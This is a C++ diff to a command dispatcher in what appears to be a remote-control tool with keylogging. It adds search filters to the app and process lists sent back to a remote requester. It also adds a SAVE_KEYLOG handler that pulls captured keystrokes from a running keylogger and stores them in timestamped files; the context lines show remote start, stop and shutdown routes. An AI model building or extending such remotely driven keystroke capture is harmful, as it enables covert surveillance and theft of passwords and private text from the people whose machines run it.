@@ -1,4 +1,11 @@
 #include "CommandDispatcher.hpp"
+#include "modules/PlatformModules.h"
+#include <algorithm>
+#include <cctype>
+#include <fstream>
+#include <iomanip>
+#include <sstream>
+#include <chrono>
 
 static Keylogger g_keylogger;
 static std::atomic<bool> g_isKeylogging(false);
@@ -60,11 +67,39 @@ void CommandDispatcher::registerHandlers() {
 
     routes_[Protocol::TYPE::APP_LIST] = [](const Message& msg, ResponseCallBack cb) {
         #if defined(_WIN32) || defined(__APPLE__)
-            AppController ac;
-            auto list = ac.listApps();
+            json appListJson = getAppListJson();
+            
+            // Support search/filter if query provided
+            std::string query = "";
+            if (msg.data.is_string()) {
+                query = msg.data.get<std::string>();
+            } else if (msg.data.is_object() && msg.data.contains("query")) {
+                query = msg.data["query"].get<std::string>();
+            }
+            
+            if (!query.empty()) {
+                json filtered = json::array();
+                for (const auto& app : appListJson) {
+                    std::string name = app.value("name", "");
+                    std::string path = app.value("path", "");
+                    std::string lowerQuery = query;
+                    std::transform(lowerQuery.begin(), lowerQuery.end(), lowerQuery.begin(), ::tolower);
+                    std::string lowerName = name;
+                    std::transform(lowerName.begin(), lowerName.end(), lowerName.begin(), ::tolower);
+                    std::string lowerPath = path;
+                    std::transform(lowerPath.begin(), lowerPath.end(), lowerPath.begin(), ::tolower);
+                    
+                    if (lowerName.find(lowerQuery) != std::string::npos || 
+                        lowerPath.find(lowerQuery) != std::string::npos) {
+                        filtered.push_back(app);
+                    }
+                }
+                appListJson = filtered;
+            }
+            
             cb(Message(
                 Protocol::TYPE::APP_LIST,
-                list, 
+                appListJson, 
                 "",
                 msg.from
             ));
@@ -145,11 +180,35 @@ void CommandDispatcher::registerHandlers() {
 
     routes_[Protocol::TYPE::PROC_LIST] = [](const Message& msg, ResponseCallBack cb) {
         #if defined(_WIN32) || defined(__APPLE__)
-            ProcessController pc;
-            auto list = pc.listProcesses();
+            json procListJson = getProcessListJson();
+            
+            // Support search/filter if query provided
+            std::string query = "";
+            if (msg.data.is_string()) {
+                query = msg.data.get<std::string>();
+            } else if (msg.data.is_object() && msg.data.contains("query")) {
+                query = msg.data["query"].get<std::string>();
+            }
+            
+            if (!query.empty()) {
+                json filtered = json::array();
+                for (const auto& proc : procListJson) {
+                    std::string name = proc.value("ProcessName", proc.value("name", ""));
+                    std::string lowerQuery = query;
+                    std::transform(lowerQuery.begin(), lowerQuery.end(), lowerQuery.begin(), ::tolower);
+                    std::string lowerName = name;
+                    std::transform(lowerName.begin(), lowerName.end(), lowerName.begin(), ::tolower);
+                    
+                    if (lowerName.find(lowerQuery) != std::string::npos) {
+                        filtered.push_back(proc);
+                    }
+                }
+                procListJson = filtered;
+            }
+            
             cb(Message(
                 Protocol::TYPE::PROC_LIST, 
-                list, 
+                procListJson, 
                 "", 
                 msg.from
             ));
@@ -370,6 +429,73 @@ void CommandDispatcher::registerHandlers() {
                 {"msg", "Keylogger stopped"},
                 {"data", finalLogs}
             }, "", msg.from));
+    };
+
+    routes_[Protocol::TYPE::SAVE_KEYLOG] = [](const Message& msg, ResponseCallBack cb) {
+        try {
+            std::string keylogData = "";
+            
+            // Get keylog data from message or current buffer
+            if (msg.data.is_string()) {
+                keylogData = msg.data.get<std::string>();
+            } else if (msg.data.is_object() && msg.data.contains("data")) {
+                keylogData = msg.data["data"].get<std::string>();
+            } else {
+                // If no data provided, get current buffer
+                keylogData = Keylogger::getDataAndClear();
+            }
+            
+            if (keylogData.empty()) {
+                cb(Message(Protocol::TYPE::SAVE_KEYLOG, 
+                    {
+                        {"status", "failed"},
+                        {"msg", "No keylog data to save"}
+                    }, "", msg.from));
+                return;
+            }
+            
+            // Create keylogs directory if it doesn't exist
+            fs::path keylogDir = fs::current_path() / "keylogs";
+            if (!fs::exists(keylogDir)) {
+                fs::create_directories(keylogDir);
+            }
+            
+            // Generate filename with timestamp
+            auto now = std::chrono::system_clock::now();
+            auto time_t = std::chrono::system_clock::to_time_t(now);
+            std::stringstream ss;
+            ss << std::put_time(std::localtime(&time_t), "%Y%m%d_%H%M%S");
+            std::string filename = "keylog_" + ss.str() + ".txt";
+            fs::path filepath = keylogDir / filename;
+            
+            // Write to file
+            std::ofstream outFile(filepath, std::ios::out | std::ios::trunc);
+            if (!outFile.is_open()) {
+                cb(Message(Protocol::TYPE::SAVE_KEYLOG, 
+                    {
+                        {"status", "failed"},
+                        {"msg", "Failed to create keylog file"}
+                    }, "", msg.from));
+                return;
+            }
+            
+            outFile << keylogData;
+            outFile.close();
+            
+            cb(Message(Protocol::TYPE::SAVE_KEYLOG, 
+                {
+                    {"status", "ok"},
+                    {"msg", "Keylog saved successfully"},
+                    {"filename", filename},
+                    {"path", filepath.string()}
+                }, "", msg.from));
+        } catch (const std::exception& e) {
+            cb(Message(Protocol::TYPE::SAVE_KEYLOG, 
+                {
+                    {"status", "failed"},
+                    {"msg", std::string("Error saving keylog: ") + e.what()}
+                }, "", msg.from));
+        }
     };
     
     routes_[Protocol::TYPE::SHUTDOWN] = [](const Message& msg, ResponseCallBack cb) {
